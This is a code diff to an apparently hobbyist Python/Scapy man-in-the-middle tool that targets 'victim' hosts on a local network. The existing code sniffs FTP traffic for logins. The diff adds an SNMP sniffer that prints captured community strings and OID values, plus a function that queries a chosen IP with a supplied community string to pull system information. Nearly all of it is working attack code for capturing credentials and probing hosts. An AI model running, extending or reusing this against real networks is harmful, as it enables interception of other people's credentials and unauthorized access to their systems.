@@ -1,6 +1,7 @@
 from scapy.all import *
 import sys
 import os
+import asn1
 from logging import getLogger, ERROR
 getLogger('scapy.runtime').setLevel(ERROR)
 
@@ -69,7 +70,7 @@ def checkLogin(packet, user, password):
         return  
 
 
-def checkPacket(packet):
+def checkFTPPacket(packet):
 
     if(packet.haslayer(Raw)):
 
@@ -94,7 +95,7 @@ def FTPSniffer(interface, victim1Ip, victim2Ip):
 
     try:
         #ftp uses 21 port for connection and 20 for data
-        sniff(iface=interface, prn=checkPacket, store=0, filter="tcp src port 21 or tcp dst port 21") #prn specifies the function to apply to a received packet and store=0 to discard them 
+        sniff(iface=interface, prn=checkFTPPacket, store=0, filter="tcp src port 21 or tcp dst port 21") #prn specifies the function to apply to a received packet and store=0 to discard them 
     except KeyboardInterrupt:
         print("Failed to init FTP sniffing. Cleaning MESS\n")
         cleanMess(victim1Ip, victim2Ip,interface)
@@ -102,6 +103,49 @@ def FTPSniffer(interface, victim1Ip, victim2Ip):
 
     print("\nStopped FTP Sniffer....\n")
     return
+def SNMPAttack():
+
+    print("\nLet's try to get system info using snmp...\n")
+
+    cstring=input("type community string: ") #because everthing is in asn1 :')
+    ipdst=input("type ip dst: ")
+
+    ans=sr1(IP(dst=ipdst)/UDP(dport=161)/SNMP(community=cstring,PDU=SNMPget(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.2.1.1.1.0"))])))
+    print(ans.show())
+
+def checkSNMPPacket(packet):
+
+    #decoder=asn1.Decoder()
+    #decoder.start(packet[SNMP].community)
+    #tag, value = decoder.read()
+    #print(type(packet[SNMP].community)
+    print("Ip dst: "+packet[IP].dst )
+    print("Community string: ")
+    packet[SNMP].community.show()
+    print("OID: ")
+    packet[SNMPvarbind].oid.show()
+    print("OID value: ")
+    packet[SNMPvarbind].value.show()
+
+    print("\n Type ctr-c to do more than sniffing")
+    return
+
+
+def SNMPSniffer(interface,victim1Ip, victim2Ip):
+
+    print("Starting SNMP Sniffer...\n")
+
+    try:
+       
+        sniff(iface=interface,prn=checkSNMPPacket, store=0,filter="udp src port 161 or udp dst port 161") #prn specifies the function to apply to a received packet and store=0 to discard them
+        SNMPAttack()
+    except KeyboardInterrupt:
+        print("Failed to init FTP sniffing. Cleaning MESS\n")
+        cleanMess(victim1Ip, victim2Ip,interface)
+        sys.exit(1)
+
+    return
+
 
 def chooseAttack(interface, victim1Ip, victim2Ip):
 
@@ -113,6 +157,8 @@ def chooseAttack(interface, victim1Ip, victim2Ip):
         
         if(typeOfAttack=='1'):
             FTPSniffer(interface, victim1Ip, victim2Ip)
+        if(typeOfAttack=='2'):
+            SNMPSniffer(interface, victim1Ip, victim2Ip)
 
     except KeyboardInterrupt:
         print("Stop typing random commands and gimme number\n")
@@ -128,20 +174,20 @@ def MITM():
     #we start by ping broadcasting our entire LAN to fill the arp table
     #so we can know the IP and MAC address of all hosts
     try:
-        IpBroadcast= input("Type the broadcast IP: ") # TODO: automatic
+        #IpBroadcast= input("Type the broadcast IP: ") # TODO: automatic
         interface = input("Type the interface name: ")
     except KeyboardInterrupt:
         print("\n\nStop typing random commands and gimme IP broadcast")
         sys.exit(1)
 
-    ping_command = "ping -b {} -c 10".format(IpBroadcast)
-    os.system(ping_command)
+    #ping_command = "ping -b {} -c 10".format(IpBroadcast)
+    #os.system(ping_command)
 
-    os.system("sleep 5")
-    print("\n\n\nAvailable hosts: \n")
+    #os.system("sleep 5")
+    #print("\n\n\nAvailable hosts: \n")
 
-    arp_command = "arp -i {} -a".format(interface)
-    os.system(arp_command)
+    #arp_command = "arp -i {} -a".format(interface)
+    #os.system(arp_command)
     # getting info victim
 
     try:
